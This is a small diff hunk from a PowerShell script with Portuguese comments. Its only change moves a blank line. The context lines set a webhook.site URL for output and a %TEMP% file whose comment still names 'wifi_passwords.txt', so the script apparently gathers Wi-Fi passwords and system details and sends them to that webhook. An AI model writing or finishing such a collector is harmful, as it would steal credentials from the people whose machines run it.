@@ -5,8 +5,8 @@ $WebhookUrl = 'https://webhook.site/77d0d5d4-f7e9-43ac-810c-0bf2139be510'
 # Pasta de exportação (padrão: %TEMP%\p)
 $ExportDirDefault = Join-Path $env:TEMP 'p'
 # Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
-
 $OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'
+
 function Get-SystemInfo {
     [CmdletBinding()]
     param(
